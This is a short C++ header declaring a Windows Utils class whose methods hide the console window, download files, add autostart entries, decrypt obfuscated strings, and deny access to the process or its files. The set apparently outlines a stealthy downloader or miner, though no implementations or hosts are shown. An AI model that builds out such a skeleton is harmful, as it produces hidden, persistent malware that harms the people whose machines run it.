#include <windows.h>
#include <Aclapi.h>
#include "Sddl.h"
#include <io.h>
#include <direct.h>
#include <iostream>
#pragma comment (lib, "urlmon.lib")

using namespace std;

class Utils
{
public:
	void HideConsole();
	bool FileExists(const char *fname);
	void DownloadFile(wchar_t *url, wchar_t *dir);
	void CreateDir(wchar_t *dir);
	void Autoload(string Name, string Path);
	int getCPU();
	char* UnEnc(char *enc, char *key, DWORD encLen);
	BOOL DenyAccess();
};